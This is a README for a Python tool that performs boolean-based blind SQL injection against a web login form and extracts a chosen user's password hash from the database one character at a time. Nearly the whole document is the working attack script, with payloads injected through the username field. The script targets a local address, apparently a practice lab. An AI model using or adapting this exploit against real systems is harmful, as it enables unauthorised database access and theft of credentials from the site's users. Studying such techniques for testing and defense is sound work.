# SQL Injection Password Hash Extractor
This Python script is designed to perform a SQL injection attack to extract password hashes from a vulnerable web application. It uses boolean-based blind SQL injection to determine the hash of the password for a given user ID.

## Features
- SQL Injection: Uses boolean-based blind SQL injection to extract password hashes.
- Detailed Logging: Tracks the number of queries made during the attack.
- Interactive Mode: Allows the user to input a user ID to extract the password hash.
## Usage
### Prerequisites:

- Install the required library:
```
pip install requests
```
- Run the Script:

Execute the script and input the user ID when prompted:
```
import requests

total_queries = 0
charset = '0123456789abcdef'
target = 'http://127.0.0.1:5000'
needle = "welcome back"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin' and {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password, {}, 1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

def password_length(user_id):
    i = 0
    while True:
        payload = "select length(password) from user where id = {} and length(password) <= {} limit 1".format(user_id, i)
        if not injected_query(payload):
            return i
        i += 1

def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(0, password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

while True:
    try:
        user_id = input("> Enter a user id to extract the password hash: ")
        if not invalid_user(user_id):
            user_password_length = password_length(user_id)
            print("\t[x] user {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            print("\t[-] user {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
        else:
            print("\t[x] user {} does not exist!".format(user_id))
    except KeyboardInterrupt:
        break
```
